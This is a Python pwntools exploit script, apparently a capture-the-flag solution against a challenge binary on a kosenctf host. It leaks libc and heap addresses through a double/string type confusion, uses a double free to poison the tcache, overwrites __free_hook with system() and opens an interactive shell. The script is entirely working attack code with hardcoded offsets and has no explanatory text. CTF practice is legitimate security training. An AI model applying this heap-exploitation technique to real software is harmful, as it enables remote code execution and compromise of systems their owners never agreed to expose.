from pwn import *
import struct
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'pwn.kosenctf.com'
PORT = 9005

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def alloc(idx, t, data, troll=False):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    if troll == True:
        r.sendlineafter(': ', t)
        return
    else:
        r.sendlineafter(': ', str(t))

    if t == 1:
        r.sendlineafter(': ', data)
    else:
        r.sendlineafter(': ', str(data))

def show():
    r.sendlineafter('> ', '2')

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

r = start()
if args.D:
    debug(r, [])

bss = 0x6020a0
alloc(0, 2, struct.unpack('d', p64(elf.got.puts))[0])
show()
r.recvuntil('string] "')
leak = u64(r.recvuntil('"')[:-1].ljust(8, '\x00'))
dbg('leak')
base = leak - 0x80a30
dbg('base')

fh = base + 0x3ed8e8
system = base + 0x4f4e0

alloc(1, 1, 'hoge')
alloc(2, 2, struct.unpack('d', p64(bss+8))[0])
show()
r.recvuntil('string] "')
r.recvuntil('string] "')
r.recvuntil('string] "')
leak = u64(r.recvuntil('"')[:-1].ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x260
dbg('heap')

alloc(4, 2, struct.unpack('d', p64(heap+0x260))[0])

delete(1)
delete(4)

alloc(5, 1, p64(fh-8))
alloc(6, 1, 'hoge')

r.sendlineafter('> ', '/bin/sh\x00' + p64(system))
# alloc(7, p64(system), '/bin/sh\x00', troll=True)

r.interactive()
r.close()
